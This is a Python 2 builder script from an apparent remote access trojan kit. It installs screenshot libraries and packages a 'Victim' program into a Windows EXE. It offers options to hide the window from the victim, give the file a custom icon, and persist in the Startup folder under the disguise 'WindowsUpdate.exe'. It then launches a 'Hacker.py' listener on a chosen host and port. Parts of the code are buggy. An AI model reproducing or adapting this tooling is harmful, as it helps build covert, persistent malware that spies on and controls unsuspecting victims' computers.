#!/usr/bin/env python
import subprocess as sub
import time
from sys import platform
import os

class color:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def startup():
    global run
    global vi

    print ("\n\n##############################################################")
    print ("#" + color.FAIL + "----------" + color.ENDC +color.OKBLUE +  color.UNDERLINE + color.BOLD + "Made by TAMT , Read licenses before using" + color.ENDC +color.FAIL + "---------" + color.ENDC +"#")
    print ("##############################################################\n\n\n")
    print (color.UNDERLINE+ color.FAIL + color.BOLD + "[!] Make sure you are connected to the internet\n" + color.ENDC)
    run = raw_input(color.BOLD + "[*] Run 'Hacker.py' file after installing pakeges. ('Y'/'N') defult is 'Y' > " + color.ENDC)
    vi = raw_input(color.BOLD + "[*] build the Victim file to EXE ? ('Y'/'N')defult is Y > " + color.ENDC)

startup()

def askQ():
    try:
        global host
        global port


        host = raw_input(color.BOLD + "[*] Enter the host to listen on ,by defult is '127.0.0.1' > " + color.ENDC)
        port = raw_input(color.BOLD + "[*] Enter the port to listen on , by default is '6464' > " + color.ENDC)
        after = raw_input(color.BOLD + "[*] After the victim clicks the program then it will be in his Startup folder ('y' / 'n' - defult) > " + color.ENDC)

        if str(after).lower() == 'y' or str(after).lower() == 'true':
            name = raw_input(color.BOLD + "[*] Write the name that it'll save as , example & defult: ('WindowsUpdate.exe') > "+color.ENDC)
            after = 'True'
        else:
            after = 'False'
            name = ''

    	if host.strip() == '':
            host = '127.0.0.1'
        if port.strip() == '':
            port = 6464
        if str(after).lower() == 'n' or str(after).lower() == 'false':
            after = 'False'
            name = ''
        else:
            if len(str(name)) <= 2:
                name = 'WindowsUpdate.exe'
        print('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
        sub.call('python Hacker.py ' + host + ' ' + str(port) + ' ' + after + ' ' + name,shell=True)

    except Exception as e:
        print (str(e))

PIP = 'Y'

try:
    import pip
except Exception:
    PIP = 'N'




def TestInstallation(name):

    if name == 'pyttsx':
        try:
            import pyttsx
            return '[*] ' + name + ' installed completed.'
        except Exception as e:
            #return ('[!] something is wrong with ' + name +' installation')
            return 'error'
            print str(e)
    elif name == 'pyinstaller':
        out = sub.Popen('pyinstaller',shell=True)

        if str(out.stdout.Read()).strip().endswith() =='pyinstaller: error: too few arguments':
            return 'have'
        else:
            return 'maybe'

    elif name == 'pyscreenshot':
        try:
            import pyscreenshot
            return '[*] ' + name + ' installed completed.'
        except Exception as e:
            #return ('[!] something is wrong with ' + name +' installation')
            return 'error'
            print str(e)


    elif name == 'PIL':
        try:
            import PIL
            return '[*] ' + name + ' installed completed.'
        except Exception as e:
            return 'error'
            print str(e)

def setup():
    global vi



    if PIP == 'N':

        print(color.WARNING + '[!] pip is not installed!\nplease install pip and run it again.\n'+ color.ENDC)

    else:

        sub.call('pip install pyttsx',shell=True)
        sub.call('pip install Pillow',shell=True)
        sub.call('pip install pyscreenshot',shell=True)
        print('\n\n')


        pyt = TestInstallation('pyttsx')
        print pyt

        screen = TestInstallation('pyscreenshot')
        print screen

        pil = TestInstallation('PIL')
        print pil

        print '\n\n\n'

        if vi.strip().lower() == 'y' or vi.strip() == '':
            name = raw_input(color.BOLD + "[*] Enter EXE file name (defult = 'Victim') > " + color.BOLD)
            icon = raw_input(color.BOLD + "[*] Icon for the exe file (Make sure your icon is in this folder) > " + color.BOLD)
            hide = raw_input(color.BOLD + "[*] Do not open black window to the victim after he runs the program , to make it invisible ? ('y'-defult/'n') > " + color.BOLD)

            if name.strip() == '':
                name = 'Victim'
            if hide.strip() == 'y' or hide.strip() == '':
                hide = ' -w '
            else:
                hide = ''

            if icon.strip() != '':
                icon = ' -i ' + icon
            All =''

            try:
                print(color.OKGREEN + "\n[*] installing pakeges..\n\n" + color.ENDC)
                sub.call('pyinstaller -n ' + name + icon + hide + '-F' + ' Victim.py',shell=True)
                print("\n")

            except Exception as e:
                print str(e)

        if run.strip().lower() == 'y' or run.strip() == '':
            if pyt != 'error' and screen and 'error' and pil != 'error':
                askQ()

            else:
                print color.WARNING + '[!] First fix the problem and then run installation again' + color.ENDC

setup()
